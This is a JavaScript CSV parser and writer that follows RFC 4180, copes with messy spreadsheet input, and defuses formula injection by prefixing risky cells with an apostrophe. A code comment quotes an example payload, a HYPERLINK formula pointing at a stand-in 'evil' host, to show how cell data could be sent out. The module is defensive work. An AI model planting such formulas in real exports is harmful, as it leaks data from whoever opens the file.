/**
 * CSV read/write, to RFC 4180 — no dependency.
 *
 * Written to survive what people actually upload from Excel, Numbers and Google
 * Sheets rather than only well-formed input: a UTF-8 BOM on the first cell, CRLF
 * or bare-CR line endings, quoted fields containing commas, newlines and
 * doubled ("") quotes, trailing blank lines, and ragged rows where a short row
 * simply omits its last columns.
 */

/**
 * Parse CSV text into an array of arrays. Never throws on malformed input —
 * an unterminated quote runs to the end of the file, which is what a
 * spreadsheet does too.
 */
function parseCsv(text) {
  const s = String(text == null ? '' : text).replace(/^﻿/, '');   // strip BOM
  const rows = [];
  let row = [], field = '', quoted = false, i = 0;

  const endField = () => { row.push(field); field = ''; };
  const endRow   = () => { endField(); rows.push(row); row = []; };

  while (i < s.length) {
    const c = s[i];

    if (quoted) {
      if (c === '"') {
        if (s[i + 1] === '"') { field += '"'; i += 2; continue; }   // escaped quote
        quoted = false; i++; continue;
      }
      field += c; i++; continue;
    }

    if (c === '"' && field === '') { quoted = true; i++; continue; }
    if (c === ',')  { endField(); i++; continue; }
    if (c === '\r') { if (s[i + 1] === '\n') i++; endRow(); i++; continue; }
    if (c === '\n') { endRow(); i++; continue; }
    field += c; i++;
  }
  // A trailing newline leaves nothing pending; anything else is a final row.
  if (field !== '' || row.length) endRow();

  // Drop rows that are entirely empty — the blank line spreadsheets leave at the
  // end, and any the user left in the middle.
  return rows.filter(r => r.some(cell => String(cell).trim() !== ''));
}

/**
 * Parse into objects keyed by the header row.
 *
 * Headers are matched loosely — case-insensitive, ignoring spaces, underscores
 * and hyphens — so "Sold Out", "sold_out" and "soldout" all reach the same
 * field and a spreadsheet's prettified headings still import.
 */
function parseCsvObjects(text) {
  const rows = parseCsv(text);
  if (!rows.length) return { headers: [], rows: [] };
  const norm = (h) => String(h).trim().toLowerCase().replace(/[\s_-]+/g, '');
  const headers = rows[0].map(norm);
  const out = rows.slice(1).map((r, idx) => {
    const o = { __line: idx + 2 };            // 1-based, counting the header
    headers.forEach((h, i) => { if (h) o[h] = r[i] == null ? '' : String(r[i]).trim(); });
    return o;
  });
  return { headers, rows: out };
}

/**
 * Quote a value only when it needs it, doubling any embedded quotes — and
 * defuse anything a spreadsheet would treat as a FORMULA rather than as text.
 *
 * Excel, Numbers and Sheets all execute a cell beginning = + - @ (or a leading
 * tab/CR before one). A sponsor name typed into the admin as
 * =HYPERLINK("https://evil/?"&A1,"Click") therefore runs on the machine of
 * whoever opens the export — the attacker never has to touch that machine.
 * Prefixing an apostrophe makes the spreadsheet read the cell as text; the
 * apostrophe itself is not shown in the cell.
 *
 * Plain numbers are exempt, so a negative price still imports as a number
 * instead of arriving as the text "-1200".
 */
const FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER  = /^-?\d+(\.\d+)?$/;

function csvCell(v) {
  let s = v == null ? '' : String(v);
  if (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Build CSV text from a header list and an array of row arrays. */
function toCsv(headers, rows) {
  // A BOM so Excel opens a UTF-8 file with accents intact rather than as latin-1.
  return '﻿' + [headers, ...rows].map(r => r.map(csvCell).join(',')).join('\r\n') + '\r\n';
}

module.exports = { parseCsv, parseCsvObjects, toCsv, csvCell };
